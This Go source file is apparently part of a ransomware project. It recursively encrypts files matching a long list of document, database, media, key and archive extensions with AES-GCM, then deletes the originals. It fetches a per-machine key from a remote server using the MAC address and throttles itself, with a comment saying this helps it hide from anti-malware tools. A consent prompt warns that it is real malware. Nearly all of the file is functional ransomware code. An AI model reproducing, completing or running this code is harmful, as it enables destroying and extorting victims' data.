package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"log"
	"math"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const NONCE_LEN = 12
const ENCRYPTED_EXTENSION = ".rce"

type StrArray []string

var WINDOWS_IGNORE_PATHS = StrArray{
	"\\Intel",
	"\\ProgramData",
	"\\WINDOWS",
	"\\Program Files",
	"\\Program Files (x86)",
	"\\AppData\\Local\\Temp",
	"\\Local Settings\\Temp",
	"This folder protects against ransomware. Modifying it will reduce protection",
	"Temporary Internet Files",
	"Content.IE5",
}

// TODO : make not every Error terminate

// Amount of bytes that will be encrypted as chunk (100MB)
// so we don't load 1GB of data into memory
const CHUNK_SIZE = 104_857_600

// MS of breaks between each chunk computation
const CHUNK_COMPUTATION_DELAY = 500 // in ms

// sprintf string to convert bytes to mac addr form
const MACSTR = "%02x:%02x:%02x:%02x:%02x:%02x"

// Defining one part of encrypted files
// Encrypted Files can have any amount of sections
type Section struct {
	nonce [NONCE_LEN]byte
	data  [CHUNK_SIZE]byte
}

// Checking if error
func checkError(e error) {
	if e != nil {
		log.Fatal(e)
	}
}

func GetCipher(key []byte) cipher.AEAD {
	// Creating cipher using general AES
	aes_cipher, err := aes.NewCipher(key)
	checkError(err)

	// Using GCM variant of AES
	gcm_cipher, err := cipher.NewGCM(aes_cipher)
	checkError(err)

	fmt.Printf("gcm.NonceSize() = %d\n", gcm_cipher.NonceSize())

	return gcm_cipher
}

// NOTE: nonce shall be securely, randomly generated and appended/prepended
// to stored encrypted data
func EncryptBytes(gcmCipher cipher.AEAD, plain []byte, nonce []byte) []byte {
	encryptedBytes := gcmCipher.Seal(nil, nonce, plain, nil)
	return encryptedBytes
}

// Fills the provided buffer of len NONCE_LEN with secure random bytes
func GenerateNonceValue(nonceBuffer []byte) {
	// Making sure buffer len fits
	if len(nonceBuffer) != NONCE_LEN {
		log.Fatalf("Buffer to generateNonceValue must be of len %d\n", NONCE_LEN)
	}

	_, err := io.ReadFull(rand.Reader, nonceBuffer)
	checkError(err)
}

func DecryptBytes(gcmCipher cipher.AEAD, encrypted []byte, nonce []byte) []byte {
	decryptedBytes, err := gcmCipher.Open(nil, nonce, encrypted, nil)
	if err != nil {
		log.Fatal(err)
	}
	// checkError(err)
	return decryptedBytes
}

func fileExists(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}
	return bool(err == nil && !fileInfo.IsDir())
}

// File structure of new file:
// Nonce: byte-array of NONCE_LEN length
// Data: up to CHUNK_SIZE encrypted data
func EncryptFile(path string, key []byte, slowDown bool) int {
	gcmCipher := GetCipher(key)

	// Getting info about path this could lead to a crash in case of a race condition
	fileInfo, _ := os.Stat(path)
	// Making sure the path exists and is a file
	if fileExists(path) {
		fileSize := fileInfo.Size()
		amountChunks := math.Ceil(float64(fileSize) / float64(CHUNK_SIZE))

		plainFileHandler, err := os.OpenFile(path, os.O_RDONLY, 0444)
		if err != nil {
			return 1
		}
		defer plainFileHandler.Close()

		encryptedFileName := path + ENCRYPTED_EXTENSION
		encryptedFileHandler, err := os.OpenFile(encryptedFileName, os.O_WRONLY|os.O_CREATE, 0666)
		if err != nil {
			return 1
		}
		defer encryptedFileHandler.Close()

		log.Printf("FileSize: %d, AmountChunks: %f", fileSize, amountChunks)

		dataRead := 0
		for {
			readBytesAmount := int64(math.Min(float64(CHUNK_SIZE), float64(fileSize-int64(dataRead))))
			fileDataBuffer := make([]byte, readBytesAmount)
			nonce := make([]byte, NONCE_LEN)
			GenerateNonceValue(nonce)

			if n, err := plainFileHandler.Read(fileDataBuffer); n == 0 || err != nil {
				break
			}

			encryptedData := EncryptBytes(gcmCipher, fileDataBuffer, nonce)
			_, err := encryptedFileHandler.Write(nonce)
			if err != nil {
				log.Println("Error while writing Nonce data to file happened.")
				log.Print(err)
			}

			_, err = encryptedFileHandler.Write(encryptedData)
			if err != nil {
				log.Println("Error while writing encrypted data data to file happened.")
				log.Print(err)
			}

			dataRead += int(readBytesAmount)

			// Sleeping to decrease CPU-overload
			time.Sleep(CHUNK_COMPUTATION_DELAY * time.Millisecond)
		}

	} else {
		log.Println("File does not exist.")
	}
	return 0
}

// Encrypt file and delete original
func EncryptDeleteFile(path string, key []byte, slowDown bool) int {
	encryptFileReturnValue := EncryptFile(path, key, slowDown)
	// Deleting original file
	if err := os.Remove(path); err != nil {
		log.Printf("Couldn't delete original file.")
		return 1
	}

	return encryptFileReturnValue
}

// Decrypting file, provided a path and the right key
// Slow down decreases CPU usage to not break everything and hide from
// Anti malware programs
func DecryptFile(path string, key []byte, slowDown bool) int {
	/*
		1. Check if file path exists
		2. Get file size (check if less than NONCE_LEN == corrupted)
		3. Fetch nonce then CHUNK_SIZE until return of read != CHUNK_SIZE after which we abort
		3. Decrypt data after nonce with nonce and key and append to file without ".rce" path
	*/

	// This makes it work, dont't know why (256 is already multiple of 16 ...)
	const CHUNK_SIZE = CHUNK_SIZE + 16

	// Check if file is .rce file
	if !strings.HasSuffix(path, ENCRYPTED_EXTENSION) {
		log.Panic("Tried to read none .rce file")
		return 1
	}

	// Check if file exists
	if !fileExists(path) {
		log.Panic("Provided file does not exist.")
		return 1
	}

	// Checking file size for corrupted-ness
	fileInfo, _ := os.Stat(path)
	fileSize := fileInfo.Size()
	if fileSize <= NONCE_LEN {
		log.Panic("File seems to be corrupted/is too short.")
		return 1
	}

	// Create O_RDONLY file handler for encrypted file
	encryptedFileHandler, err := os.OpenFile(path, os.O_RDONLY, 0666)
	if err != nil {
		return 1
	}
	defer encryptedFileHandler.Close()

	// Get new gcmCipher
	gcmCipher := GetCipher(key)

	// Create O_WRONLY file handler for decrypted file
	decryptedFileFilename := strings.TrimSuffix(path, ENCRYPTED_EXTENSION)
	decryptedFileHandler, err := os.OpenFile(decryptedFileFilename, os.O_WRONLY|os.O_CREATE, 0666)

	// Looping and decrypting file
	nonce := make([]byte, NONCE_LEN)
	amountBytesRead := 0
	for {
		// Reading in 'nonce' value
		bytesRead, err := encryptedFileHandler.Read(nonce)
		if bytesRead != NONCE_LEN || err != nil {
			log.Panic("Could not read nonce")
			return 1
		}
		amountBytesRead += NONCE_LEN

		nextChunkSize := int(math.Min(CHUNK_SIZE, float64(fileSize-int64(amountBytesRead))))
		encryptedDataBuffer := make([]byte, nextChunkSize)
		bytesRead, err = encryptedFileHandler.Read(encryptedDataBuffer)
		if bytesRead == 0 || err != nil {
			break
		}
		amountBytesRead += nextChunkSize

		// Decrypting the fetched data with current nonce and key
		decryptedDataBuffer := DecryptBytes(gcmCipher, encryptedDataBuffer, nonce)

		// Writing decrypted data to original file
		decryptedFileHandler.Write(decryptedDataBuffer)

		// Checking if we have read the entire file
		if amountBytesRead >= int(fileSize) {
			break
		}
		// Sleeping to decrease CPU usage
		time.Sleep(CHUNK_COMPUTATION_DELAY * time.Millisecond)

	}

	return 0
}

// Formats mac addresses provided as uint64 to
// xx:xx:xx:xx:xx format
func FormatUint64MacAddress(macInt uint64) string {
	byteMacAddr := make([]byte, 8)
	binary.BigEndian.PutUint64(byteMacAddr, macInt)
	return fmt.Sprintf(MACSTR, byteMacAddr[0], byteMacAddr[1], byteMacAddr[2], byteMacAddr[3],
		byteMacAddr[4], byteMacAddr[5])
}

// Get Device MAC address
func MacUint64() uint64 {
	interfaces, err := net.Interfaces()
	if err != nil {
		return uint64(0)
	}

	for _, i := range interfaces {
		if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {

			// Skip locally administered addresses
			if i.HardwareAddr[0]&2 == 2 {
				continue
			}

			var mac uint64
			for j, b := range i.HardwareAddr {
				if j >= 8 {
					break
				}
				mac <<= 8
				mac += uint64(b)
			}

			return mac
		}
	}

	return uint64(0)
}

func FetchAesKey(mac string, httpClient *http.Client) []byte {
	postData := url.Values{
		"mac": {mac},
	}

	// Fetching own AES key
	serverLocationPort := fmt.Sprintf("https://%s:%s/%s", TEST_SERVER_URL, TEST_SERVER_PORT, TEST_GET_KEY_PATH)
	resp, err := httpClient.PostForm(serverLocationPort, postData)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	// Parsing aes key out of response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	base64AesKey := string(body)
	log.Print(base64AesKey)
	aesKey := make([]byte, 16)
	_, err = base64.URLEncoding.Decode(aesKey, []byte(base64AesKey))
	if err != nil {
		log.Fatal(err)
	}
	return aesKey
}

func GetUserConsent() {
	fmt.Println("You are about to run ACTUAL malware on your system.")
	fmt.Println("It will encrypt your entire home directory.")
	fmt.Println("If you are sure you want to procede type: 'Encrypt-all'")
	fmt.Printf(">> ")
	var userConsent string
	_, err := fmt.Scanln(&userConsent)
	checkError(err)
	if string(userConsent) != "Encrypt-all" {
		fmt.Println("Wise decision.")
		os.Exit(0)
	}
}

// Decrypt file and delete original (encrypted) file
func DecryptDeleteFile(path string, key []byte, slowDown bool) int {
	decryptFileReturnValue := DecryptFile(path, key, slowDown)
	// Deleting original file
	if err := os.Remove(path); err != nil {
		log.Printf("Couldn't delete original file.")
		return 1
	}

	return decryptFileReturnValue
}

// Recursive function to decrypt files
func DecryptFromRoot(root string, key []byte, slowDown bool) {
	filepath.WalkDir(root, func(fullPath string, dirEntry fs.DirEntry, err error) error {
		filename := dirEntry.Name()
		// Check if file extension shall be encrypted
		if filepath.Ext(filename) == ENCRYPTED_EXTENSION {
			fmt.Printf("Decrypting: %s\n", filename)
			DecryptDeleteFile(fullPath, key, false)
		}
		return err
	})
}

func CheckUserDecryptFiles() {
	if len(os.Args) > 1 {
		if os.Args[1] == "decrypt" {
			if len(os.Args) != 3 {
				fmt.Println("You have to supply base64 encoded decryption key.")
				os.Exit(1)
			}
			key, err := base64.URLEncoding.DecodeString(os.Args[2])
			checkError(err)

			DecryptFromRoot(ENCRYPTION_START_PATH, key, false)
			fmt.Println("Successfully decrypted all your files!")

			// Exit, so we don't just re-encrypt all the files
			os.Exit(0)
		}
	}
}

var FILEXT_TO_ENCRYPT = StrArray{".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".ps1", ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"}

// Checking if String in string array contains subString
func HasAnySubstr(path string, list StrArray) bool {
	for _, toIgnore := range list {
		if strings.Contains(path, toIgnore) {
			return true
		}
	}
	return false
}

// Checking if string in string array
func (list StrArray) Has(a string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

// Recursive function to encrypt files
func EncryptFromRoot(root string, key []byte, slowDown bool) {

	filepath.WalkDir(root, func(fullPath string, dirEntry fs.DirEntry, err error) error {
		filename := dirEntry.Name()
		// Check if file extension shall be encrypted
		if FILEXT_TO_ENCRYPT.Has(filepath.Ext(filename)) {
			// For Windows Files, check that paths to be ignored are actually ignored
			if !HasAnySubstr(fullPath, WINDOWS_IGNORE_PATHS) {
				fmt.Printf("Encrypting: %s\n", filename)
				EncryptDeleteFile(fullPath, key, false)
			}
		}
		return err
	})
}
